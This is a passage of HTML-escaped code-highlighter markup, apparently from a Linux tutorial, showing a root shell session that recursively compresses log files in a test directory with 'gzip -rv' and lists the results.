&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-17&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-19&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cd ..&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-21&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# gzip -rv test6&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-23&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;replaced&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-25&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;99.6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;replaced&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-27&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;replaced&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-28&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-29&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;47.5&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;replaced&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-30&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-31&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;99.6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;replaced&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-32&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-33&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;replaced&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-34&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-35&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;replaced&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-36&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-37&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cd test6&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-38&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-39&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-40&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-41&quot;&gt;总计 &lt;span class=&quot;crayon-cn&quot;&gt;28&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-42&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-43&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;1341&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-44&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-45&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1341&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-46&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-47&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;   &lt;span class=&quot;crayon-cn&quot;&gt;70&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-48&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-49&quot;&gt;
